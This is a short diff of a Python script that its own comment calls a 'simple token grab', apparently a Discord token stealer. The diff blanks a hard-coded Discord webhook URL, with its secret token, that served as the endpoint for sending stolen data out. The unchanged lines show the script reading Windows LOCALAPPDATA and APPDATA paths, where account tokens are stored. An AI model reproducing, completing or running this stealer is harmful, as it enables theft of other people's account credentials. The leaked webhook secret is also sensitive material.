@@ -1,3 +1,5 @@
+#Simple token grab not by me :)
+
 import os
 
 if os.name != "nt":
@@ -11,7 +13,7 @@ from threading import Thread
 from time import sleep
 from sys import argv
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/879083101035315231/v5p_CwVlHyzHj9DnORMQi35amxbXesurUO7jdBtR0Tu2cyvMbwuBncGVd5ffs_s3eCki"
+WEBHOOK_URL = ""
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
